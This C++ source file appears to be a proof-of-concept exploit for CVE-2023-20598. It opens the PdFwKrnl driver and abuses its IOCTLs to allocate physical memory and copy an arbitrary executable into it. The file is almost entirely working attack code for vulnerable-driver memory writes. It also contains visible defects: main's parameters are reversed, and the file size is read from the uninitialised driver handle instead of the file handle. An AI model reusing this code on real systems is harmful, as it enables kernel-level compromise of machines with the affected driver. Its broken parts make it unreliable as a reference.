#include <iostream>
#include <Windows.h>
#include "Ioctl.h"


// Global variables:
const char* DeviceName = "\\Device\\PdFwKrnl";
const char* SymbolicLink = "\\\\.\\PdFwKrnl";
HANDLE DriverHandle = INVALID_HANDLE_VALUE;


DWORD CopyExeIntoSystem(PVOID ExeInfo, DWORD ExeSize, char* ExeName, 
    PPHYSICAL_ADDRESS PhysicalAllocationOutput, PVOID* VirtualAllocationOutput) {
    ALLOC_MEMORY_BUFFER AllocationInfo = { 0 };
    DWORD LastError = ERROR_SUCCESS;
    DWORD CurrentValue = 0;
    PHYSICAL_ADDRESS PhysicalAllocation = { 0 };
    if (ExeInfo == NULL || ExeSize == 0 || ExeName == NULL) {
        printf("[-] Invalid parameters for CopyExeIntoSystem\n");
        return ERROR_INVALID_PARAMETER;
    }


    // Allocate contiguous memory for executable after alligning size to sizeof(DWORD):
    if (!IoctlTriggers::AllocatePhysicalMemory(ExeSize, &AllocationInfo, DriverHandle)) {
        printf("[-] Failed to allocate contiguous memory with driver %s\n", SymbolicLink);
        return ERROR_INSUFFICIENT_BUFFER;
    }
    printf("[+] Allocated contiguous memory for driver %s at physical address %p, contiguous base = %p\n",
        SymbolicLink, (PVOID)AllocationInfo.PhysicalAddress.QuadPart, AllocationInfo.AllocatedVirtualMemory);
    PhysicalAllocation = AllocationInfo.PhysicalAddress;


    // Write driver data into contiguous memory in sizeof(DWORD) jumps:
    for (DWORD CurrentIndex = 0; CurrentIndex < ExeSize; CurrentIndex += sizeof(DWORD)) {
        RtlCopyMemory(&CurrentValue, (PVOID)((ULONG64)ExeInfo + CurrentIndex), sizeof(DWORD));
        if (!IoctlTriggers::WriteIntoPhysicalMemory(CurrentValue, (PVOID)(PhysicalAllocation.QuadPart + CurrentIndex), DriverHandle)) {
            printf("[-] Failed to write value %d into physical allocation %p, offset %d with driver %s\n",
                CurrentValue, (PVOID)PhysicalAllocation.QuadPart, CurrentIndex, SymbolicLink);
            return ERROR_WRITE_FAULT;
        }
    }
    printf("[+] Finished writing executable %s into contiguous memory at (physical %p, virtual %p) using driver %s\n",
        ExeName, (PVOID)PhysicalAllocation.QuadPart, AllocationInfo.AllocatedVirtualMemory, SymbolicLink);
    if (PhysicalAllocationOutput != NULL) {
        *&PhysicalAllocationOutput->QuadPart = PhysicalAllocation.QuadPart;
    }
    if (VirtualAllocationOutput != NULL) {
        *VirtualAllocationOutput = AllocationInfo.AllocatedVirtualMemory;
    }
    return ERROR_SUCCESS;
}


int main(char* argv[], int argc) {
    DWORD BytesReturned = 0;
    struct stat CheckExists = { 0 };
    HANDLE ExecutableHandle = INVALID_HANDLE_VALUE;
    PVOID ExecutableData = NULL;
    DWORD ExecutableSize = 0;
    DWORD ExecutableRead = 0;
    DWORD AllignedSize = 0;
    DWORD LastError = ERROR_SUCCESS;
    PHYSICAL_ADDRESS PhysicalAllocation = { 0 };
    PVOID VirtualAllocation = NULL;


    // Check for invalid parameters;
    if (argc != 2) {
        printf("[-] Invalid command-line parameters: CVE-2023-20598.exe [path_to_exe]\n");
        return FALSE;
    }
    if (stat(argv[1], &CheckExists) != 0) {
        printf("[-] Invalid command-line parameters: CVE-2023-20598.exe [existing_path_to_exe]\n");
        return FALSE;
    }


    // Get information about executable (allign executable data to sizeof(DWORD) for contiguous allocation):
    ExecutableHandle = CreateFileA(argv[1], GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (ExecutableHandle == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to get handle to executable file %s: %d\n", argv[1], GetLastError());
        return FALSE;
    }
    ExecutableSize = GetFileSize(DriverHandle, NULL);
    AllignedSize = ((ExecutableSize / sizeof(DWORD)) + 1) * sizeof(DWORD);
    ExecutableData = malloc(AllignedSize);
    if (ExecutableData == NULL) {
        printf("[-] Failed to allocate memory for executable file %s: %d\n", argv[1], GetLastError());
        CloseHandle(ExecutableHandle);
        return FALSE;
    }
    if (!ReadFile(ExecutableHandle, ExecutableData, ExecutableSize, &ExecutableRead, NULL) ||
        ExecutableRead != ExecutableSize) {
        printf("[-] Failed to read executable file %s: %d\n", argv[1], GetLastError());
        free(ExecutableData);
        CloseHandle(ExecutableHandle);
        return FALSE;
    }
    CloseHandle(ExecutableHandle);


    // Get handle to driver:
    DriverHandle = CreateFileA(SymbolicLink, GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) {
        LastError = GetLastError();
        printf("[-] Failed to get handle to driver %s: %d\n", SymbolicLink, LastError);
        free(ExecutableData);
        return FALSE;
    }
    printf("[+] Got handle to driver %s - %d\n", SymbolicLink, (DWORD)DriverHandle);


    // Call function to copy executable into contiguous system memory:
    LastError = CopyExeIntoSystem(ExecutableData, AllignedSize, argv[1], &PhysicalAllocation, &VirtualAllocation);
    if (LastError != ERROR_SUCCESS) {
        printf("[-] Copying executable %s into contiguous system memory failed - %d\n", argv[1], LastError);
        free(ExecutableData);
        return FALSE;
    }
    printf("[+] Copied executable %s into contiguous system memory\n", argv[1]);
    free(ExecutableData);


    // Free contiguous memory after performing operation:
    if (!IoctlTriggers::FreeContiguousMemory(VirtualAllocation, DriverHandle)) {
        printf("[-] Freeing executable %s from contiguous system memory at %p failed - %d\n", argv[1], VirtualAllocation, LastError);
        return FALSE;
    }
    printf("[+] Freed executable %s from contiguous system memory at %p\n", argv[1], VirtualAllocation);
    return TRUE;
}
